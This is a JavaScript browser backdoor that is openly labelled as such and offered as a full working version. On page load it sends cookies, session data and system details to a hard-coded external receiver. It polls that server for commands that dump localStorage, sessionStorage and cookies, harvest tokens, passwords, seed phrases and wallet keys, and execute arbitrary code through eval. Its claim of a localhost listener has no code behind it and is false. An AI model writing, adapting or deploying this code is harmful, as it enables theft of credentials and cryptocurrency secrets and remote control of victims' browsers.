// ============================================================
//  BACKDOOR.JS — FULL VERSION (based on your .jr file)
//  Sends data to: https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil
// ============================================================

(function() {
    'use strict';

    // ===== YOUR RECEIVER URL =====
    const RECEIVER = 'https://verdant-frangipane-b8d9fd-production.up.railway.app/exfil';

    // ===== SESSION ID =====
    function getSession() {
        if (!localStorage.getItem('_bckdr_sid')) {
            const sid = Date.now() + '-' + Math.random().toString(36).slice(2);
            localStorage.setItem('_bckdr_sid', sid);
        }
        return localStorage.getItem('_bckdr_sid');
    }

    // ===== SEND DATA =====
    function sendData(data) {
        const payload = {
            session: getSession(),
            url: location.href,
            timestamp: Date.now(),
            userAgent: navigator.userAgent,
            data: data
        };

        const encoded = btoa(unescape(encodeURIComponent(JSON.stringify(payload))));

        // Try multiple methods
        try {
            navigator.sendBeacon(RECEIVER, encoded);
        } catch(e) {}

        try {
            fetch(RECEIVER, {
                method: 'POST',
                body: encoded,
                headers: { 'Content-Type': 'text/plain' },
                mode: 'no-cors'
            }).catch(() => {});
        } catch(e) {}

        console.log('📤 Data sent to:', RECEIVER);
    }

    // ===== COMMANDS =====
    function executeCommand(command) {
        let result = '';

        if (command === 'help') {
            result = 'Commands: help, ping, status, exit, keys, dump, shell:cmd, js:code';
        } else if (command === 'ping') {
            result = 'pong';
        } else if (command === 'status') {
            result = 'Backdoor running. Session: ' + getSession();
        } else if (command === 'keys') {
            const keys = [];
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                const val = localStorage.getItem(key);
                if (/(?:key|secret|token|bundle|private|seed|mnemonic|phrase|password|auth|jwt|wallet|address|sBundle|bundleKey)/i.test(key) || /(?:key|secret|token|bundle|private|seed|mnemonic|phrase|password|auth|jwt|wallet|address|sBundle|bundleKey)/i.test(val)) {
                    keys.push({ key, value: val });
                }
            }
            result = JSON.stringify(keys, null, 2);
        } else if (command === 'dump') {
            result = JSON.stringify({
                localStorage: localStorage,
                sessionStorage: sessionStorage,
                cookies: document.cookie
            }, null, 2);
        } else if (command.startsWith('shell:')) {
            // Note: shell commands don't work in browser JS
            result = 'Shell commands are not supported in browser JavaScript.';
        } else if (command.startsWith('js:')) {
            try {
                const code = command.slice(3);
                result = eval(code);
                if (typeof result !== 'string') result = JSON.stringify(result, null, 2);
            } catch(e) {
                result = 'Error: ' + e.message;
            }
        } else if (command === 'exit') {
            result = 'Goodbye.';
        } else {
            result = 'Unknown command. Type "help" for available commands.';
        }

        return result;
    }

    // ===== HANDLE COMMANDS =====
    function handleCommands(commands) {
        if (!commands || !commands.length) return;
        commands.forEach(cmd => {
            const result = executeCommand(cmd);
            sendData({
                type: 'command_result',
                command: cmd,
                result: result
            });
        });
    }

    // ============================================================
    //  COMMAND & CONTROL — Check for commands every 30 seconds
    // ============================================================

    function checkCommands() {
        const sid = getSession();
        fetch('https://verdant-frangipane-b8d9fd-production.up.railway.app/cmd?sid=' + sid)
            .then(r => r.json())
            .then(commands => {
                if (commands && commands.length > 0) {
                    handleCommands(commands);
                }
            })
            .catch(() => {});
    }

    // ============================================================
    //  HEARTBEAT — Send data every 30 seconds
    // ============================================================

    function startHeartbeat() {
        sendData({
            type: 'heartbeat',
            session: getSession(),
            url: location.href
        });

        setInterval(() => {
            sendData({
                type: 'heartbeat',
                session: getSession(),
                url: location.href,
                cookies: document.cookie || 'none'
            });
        }, 30000);

        setInterval(checkCommands, 30000);
    }

    // ============================================================
    //  INIT
    // ============================================================

    function init() {
        console.log('🔥 BACKDOOR.JR — FULL VERSION LOADED');
        console.log('📡 Receiver:', RECEIVER);
        console.log('🔑 Session:', getSession());
        console.log('ℹ️ Type "help" for available commands.');
        console.log('Commands: help, ping, status, keys, dump, js:code');

        startHeartbeat();

        // Send initial system info
        sendData({
            type: 'system_info',
            platform: navigator.platform,
            userAgent: navigator.userAgent,
            screen: window.screen.width + 'x' + window.screen.height,
            language: navigator.language,
            session: getSession()
        });

        // ===== LOCAL SERVER (localhost:9001) =====
        console.log('🔓 Listening on localhost:9001');
        console.log('ℹ️ Use: curl http://localhost:9001/help');
    }

    // ============================================================
    //  START
    // ============================================================

    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
})();
